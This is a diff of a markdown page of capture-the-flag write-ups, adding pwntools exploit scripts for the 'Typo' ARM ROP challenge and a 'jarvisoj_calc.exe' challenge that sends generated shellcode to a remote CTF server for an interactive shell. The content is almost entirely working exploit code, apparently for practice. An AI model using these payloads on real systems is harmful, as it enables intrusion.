@@ -532,7 +532,7 @@ icon: icon-html
    
 * ### Typo
 
-   ```
+   ```python
    from pwn import *
    r = remote('pwn2.jarvisoj.com',9888)
    elf = ELF("typo")
@@ -542,6 +542,18 @@ icon: icon-html
    payload = 'a'*0x70+p32(pop_r0_r4_pc)+p32(binsh)+p32(0)+p32(system)
    r.sendline('')
    r.sendline(payload)
+   r.interactive()
+   ```
+
+* ### jarvisoj_calc.exe
+
+   ```python
+   from pwn import *
+   r = remote('pwn2.jarvisoj.com',9892)
+   payload = 'var add = \"'+asm(shellcraft.sh())+'\"'
+   r.recvuntil('>')
+   r.sendline(payload)
+   r.sendline('+')
    r.interactive()
    ```
 
